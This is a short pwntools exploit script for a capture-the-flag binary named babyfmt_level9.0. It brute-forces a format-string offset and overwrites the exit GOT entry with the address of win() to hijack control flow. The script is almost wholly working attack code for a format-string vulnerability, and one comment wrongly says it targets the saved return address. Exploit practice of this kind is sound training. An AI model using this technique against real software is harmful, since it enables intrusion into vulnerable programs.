# idea: exit@Plt is called after printf. No PIE, partial RELRO. simply write win() (0x401500) into exit@got

from pwn import *

context.arch = 'amd64'

def get_offset():
    dummy = b"aaaabaaacaaadaaaeaaa"
    for i in range(6, 100):
        p = process("/challenge/babyfmt_level9.0")
        print(p.recv())
        p.send(dummy + b"INIT" + b"%" + f'{i:d}'.encode('utf-8') + b"$pFINI")
        p.recvuntil(b"Your input is:")
        p.recvline()
        output = p.recv()
        print(output)
        p.close()
        if b"616161" in output:
            # either in offset or in padding
            leak = output[output.index(b"INIT") + 4 : output.index(b"FINI")]
            leak = leak[2:]
            if leak[-2:] != b'61' and leak[-2:] != b'62':
                # we are in padding
                continue
            else:
                leak = bytes.fromhex(leak.decode())[::-1]
                padlen = cyclic_find(leak)
                return padlen, i


padlen, offset = get_offset()
print(padlen)
print(offset)

elf = ELF("/challenge/babyfmt_level9.0")

p = process("/challenge/babyfmt_level9.0")

# write win addr to saved rip

payload = b"A" * padlen + fmtstr_payload(offset, {elf.got['exit']: elf.sym['win']}, numbwritten = 117 + padlen) # # of written bytes need to include payload in previous loops
print(payload)
p.send(payload)
p.interactive()

